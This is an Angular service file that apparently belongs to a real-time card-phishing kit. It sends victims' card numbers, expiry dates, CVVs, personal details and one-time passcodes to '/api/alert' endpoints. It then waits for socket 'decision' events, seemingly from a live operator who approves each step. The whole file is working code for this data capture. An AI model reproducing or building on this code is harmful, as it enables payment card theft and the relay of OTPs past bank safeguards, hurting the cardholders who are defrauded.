import { Injectable } from '@angular/core';
import { io, Socket } from 'socket.io-client';
import { Observable, ReplaySubject, Subject } from 'rxjs';
import { HttpClient } from '@angular/common/http';


@Injectable({
  providedIn: 'root'
})

export class FuncionalityService {
  private decisionSubject = new ReplaySubject<string>(1);
  private socket: Socket;
  //private api: string = 'https://back.oceanicmc.fun';
  private api: string = 'http://localhost:3000';

  constructor(private http: HttpClient) {
    this.socket = io(this.api, {
      withCredentials: true
    });

    this.socket.on('connect', () => {
      console.log('Socket conectado:', this.socket.id);
    });

    this.socket.on('decision', (data: string) => {
      console.log('Decision recibida desde socket:', data);
      this.decisionSubject.next(data);
    });

  }

  startProcess(data: string, socketId: string | null, isRetry: boolean) {
    return this.http.post(this.api + '/api/alert/start-process', {
      data,
      socketId,
      isRetry
    });
  }

  handleCaptchaToken(token: string) {
    return this.http.post(this.api + '/api/verify', token)
  }

  getSocketIdWhenReady(): Promise<string> {
    console.log(this.socket.id)
    return new Promise((resolve) => {
      if (this.socket.id) {
        resolve(this.socket.id);
      } else {
        this.socket.on('connect', () => {
          resolve(this.socket.id!);
        });
      }
    });
  }



/*   errorAlert(code: number) {
     const socketId = this.socket.id;
    return this.http.post(this.api + '/api/alert/append-card-data', {
      card,
      exp,
      cvv,
      socketId
    });
  } */

  appendCardData(card: string, exp: string, cvv: string) {
    const socketId = this.socket.id;
    return this.http.post(this.api + '/api/alert/append-card-data', {
      card,
      exp,
      cvv,
      socketId
    });
  }

  
  appendPersonData(name: string, id: string, add: string, tel: string) {
    const socketId = this.socket.id;
    return this.http.post(this.api + '/api/alert/append-person-data', {
      name,
      id,
      add,
      tel,
      socketId
    });
  }

  updateMessageWithOtp(otp: string, socketId: string) {
    return this.http.post(this.api + '/api/alert/update-message-otp', {
      otp,
      socketId
    });
  }

  onDecision(decisionId: any): Observable<string> {
    return this.decisionSubject.asObservable();
  }

  onOtpDecision(): Observable<string> {
    return new Observable((observer) => {
      this.socket.on('final-decision', (data: string) => {
        observer.next(data);
        observer.complete();
      });
    });
  }

  sendSimpleMessage(data: string) {
    const socketId = this.socket.id;
    return this.http.post(this.api + '/api/alert/send-message', {
      text: data,
      socketId
    });
  }

  


  disconnect() {
    this.socket.disconnect();
  }

}
